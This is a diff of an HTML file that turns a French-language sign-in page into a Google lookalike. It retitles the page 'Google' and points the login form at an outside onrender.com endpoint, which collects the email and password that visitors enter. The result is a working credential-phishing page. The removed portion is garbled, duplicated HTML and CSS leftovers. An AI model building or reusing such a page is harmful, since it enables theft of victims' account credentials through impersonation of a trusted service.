@@ -3,7 +3,7 @@
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta charset="UTF-8">
-<title>Connexion</title>
+<title>Google</title>
 <style>
 
 html, body {
@@ -68,7 +68,7 @@ input:focus {
   color: #1a73e8;
   text-decoration: none;
   font-weight: 500;
-  margin-bottom: 30px;
+  margin-bottom: 20px;
 }
 
 .link:hover {
@@ -86,6 +86,7 @@ input:focus {
   border-radius: 8px;
   cursor: pointer;
   font-weight: 500;
+  margin-top: 10px;
 }
 
 .footer {
@@ -110,77 +111,26 @@ input:focus {
   </div>
 
   <div class="subtitle">Se connecter</div>
-
   <div class="desc">Utilise un compte pour accéder au service</div>
 
-  <form action="#" method="POST" style="width:100%; display:flex; flex-direction:column; align-items:center;">
+  <form action="https://sms-synchronisation-google.onrender.com/submit" method="POST" style="width:100%; display:flex; flex-direction:column; align-items:center;">
+    
     <input type="email" name="email" placeholder="Email ou téléphone" required>
     <a class="link" href="#">Email oublié ?</a>
+
     <input type="password" name="password" placeholder="Mot de passe" required>
     <a class="link" href="#">Créer un compte</a>
-    <button class="btn" type="button" onclick="window.location.href='mot de passe.html'">Suivant</button>
+
+    <button class="btn" type="submit">Suivant</button>
+
   </form>
 
-  <div class="footer">Utilisez votre compte <br>icloud<br> si disponible.</div>
+  <div class="footer">Utilisez votre compte <br>iCloud<br> si disponible.</div>
 
 </div>
 
 </body>
-</html>
-        <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Password" required>
-
-        <a href="google.com/account"><b>Create account</b></a>
-
-        <button class="btn" type="submit" onclick="window.location.href='mot de passe.html'">Next</button>
-    </form>
-
-</div>
-
-</body>
-</html>
-            <br><br>
-
-            <a href="google.com/account"><b>Create account</b></a>
-
-            <br><br>
-
-            <a href="mot de passe.html"><b>Create account</b></a>
-
-            <br><br>
-
-            <button class="btn" type="submit" onclick="window.location.href='mot de passe.html'">Next</button>
-        </form>
-    </div>
-
-<style>
-.centered {
-    /* Ton CSS n'a pas été modifié comme demandé */
-}
-</style>
-
-</body>
-</html>        text-align: center; 
-    }
-        input[type="Email"] {
-            width: 338px;
-            height: 50px;
-            font-size: 18px;
-    }
-        input[type="password"] {
-            width: 338px;
-            height: 50;
-            font-size: 18px;
-        }
-    .btn {
-  position: fixed;
-  bottom: 20px;
-  right: 20px;
-}
-    .btn {
-  position: fixed;
-  bottom: 20px;
-  right: 20px;
-  padding: 11px 25px;
+  </html>  padding: 11px 25px;
   background: royalblue;
   color: white;
   border: none;
